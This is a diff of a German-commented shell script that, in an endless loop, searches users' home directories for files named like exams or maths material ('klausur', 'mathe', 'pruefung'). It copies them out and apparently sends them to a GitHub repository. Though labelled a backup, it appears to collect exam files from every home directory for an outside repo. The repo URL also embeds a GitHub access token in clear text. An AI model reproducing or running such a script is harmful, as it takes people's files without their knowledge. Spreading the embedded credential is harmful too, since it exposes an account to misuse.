@@ -2,7 +2,7 @@
 while true; do
     #exit 0 # REMOVE
     # === KONFIGURATION ===
-    GIT_REPO_URL="https://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@github.com/kaltsch/stuff.git"
+    GIT_REPO_URL="https://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@github.com/kaltsch/stuff2.git"
     GIT_BRANCH="main"                                            
 
     # Wichtige absolute Pfade
@@ -38,7 +38,7 @@ while true; do
         echo "Verarbeite Home-Verzeichnis: $HOME_DIR"
 
         # === Backup-Dateien finden und kopieren ===
-        $FIND_BIN "$HOME_DIR" -type f \( -iname '*klausur*' -o -iname '*mathe*' -o -iname '*test*' \) | while read -r file; do
+        $FIND_BIN "$HOME_DIR" -type f \( -iname '*klausur*' -o -iname '*mathe*' -o -iname '*pruefung*' \) | while read -r file; do
             REL_PATH=$($REALPATH_BIN --relative-to="$HOME_DIR" "$file")
             DEST_DIR="$TMP_DIR/files/$(basename "$HOME_DIR")/$(dirname "$REL_PATH")"
             $MKDIR_BIN -p "$DEST_DIR"
